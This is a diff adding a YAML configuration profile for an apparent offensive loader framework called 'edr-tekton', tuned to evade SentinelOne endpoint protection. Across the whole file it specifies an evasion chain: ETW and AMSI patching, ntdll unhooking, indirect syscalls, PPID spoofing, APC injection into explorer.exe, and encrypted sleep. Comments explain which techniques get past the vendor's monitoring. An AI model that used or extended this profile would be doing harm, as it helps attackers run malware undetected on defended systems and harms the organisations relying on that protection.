@@ -1,0 +1,130 @@
+# edr-tekton :: SentinelOne Singularity Profile
+#
+# SentinelOne focuses heavily on behavioral analysis and
+# user-mode hooking. Their minifilter sits at altitude 389040.
+# Strong on kernel callbacks but less aggressive on ETW
+# compared to CrowdStrike.
+#
+# Key detection strengths:
+#   - Deep ntdll.dll inline hooks
+#   - Behavioral engine (process chains, file patterns)
+#   - Kernel callbacks for process/thread/image
+#   - Rollback capability (VSS-based)
+#   - Static AI engine for initial scan
+#   - AMSI provider
+#
+# Strategy: unhook ntdll + indirect syscalls + APC injection
+# to avoid thread creation telemetry
+
+profile:
+  name: sentinelone_singularity
+  display_name: "SentinelOne Singularity"
+  version: "1.0"
+  vendor: sentinelone
+
+threat_levels:
+  user_hooks: critical     # Heavy ntdll inline hooks
+  kernel_cb: high          # Process/thread/image callbacks
+  etw: medium              # Less ETW-dependent than CrowdStrike
+  minifilter: high         # Altitude 389040
+  wfp: medium              # Network inspection
+  scanner: high            # Static AI + behavioral
+  elam: medium             # Service protection
+  nirvana: low
+  hypervisor: none
+
+stages:
+  fingerprint:
+    primary: auto
+    required: true
+
+  api_resolve:
+    primary: peb_walk
+    fallbacks:
+      - hash_resolve
+      - dynamic_resolve
+    required: true
+    max_risk: 25
+
+  evasion_pre:
+    primary: etw_patch
+    fallbacks:
+      - etw_blind
+    required: false
+    max_risk: 30
+    additional:
+      - amsi_patch
+      - sandbox_detect
+      - ppid_spoof
+
+  syscall_init:
+    primary: indirect_syscall
+    fallbacks:
+      - tampered_syscall
+      - direct_syscall
+    required: true
+    max_risk: 20
+    additional:
+      - ssn_resolve
+      - unhook_ntdll
+    notes: "ntdll unhooking is effective here, S1 hooks are standard inline JMPs"
+
+  decrypt:
+    primary: encrypt_aes
+    fallbacks:
+      - encrypt_triple
+      - encrypt_rc4
+    required: true
+    max_risk: 15
+
+  inject:
+    primary: inject_apc
+    fallbacks:
+      - inject_threadless
+      - inject_callback
+      - inject_classic
+    required: true
+    max_risk: 30
+    notes: "APC injection avoids CreateRemoteThread which S1 monitors heavily"
+
+  sleep_init:
+    primary: sleep_foliage
+    fallbacks:
+      - sleep_zilean
+      - sleep_ekko
+    required: false
+    max_risk: 15
+    additional:
+      - sleep_beacongate
+
+  cleanup:
+    primary: auto
+    required: false
+
+constraints:
+  max_total_risk: 140
+  prefer_stealthy: true
+  require_x64: true
+  min_os_build: 17134      # Win10 1803+
+
+sleep:
+  interval_ms: 6000
+  encrypt: true
+
+encryption:
+  layers:
+    - type: aes256
+      key_source: env
+    - type: xor
+      key_source: static
+
+inject_target: "explorer.exe"
+ppid_parent: "explorer.exe"
+
+notes: >
+  SentinelOne's user-mode hooks are standard inline JMPs,
+  making ntdll unhooking effective. Their behavioral engine
+  watches process chains, so PPID spoofing under explorer.exe
+  is important. APC injection preferred over remote threads.
+  Less aggressive on ETW than CrowdStrike, so ETW patching
+  is optional but recommended.
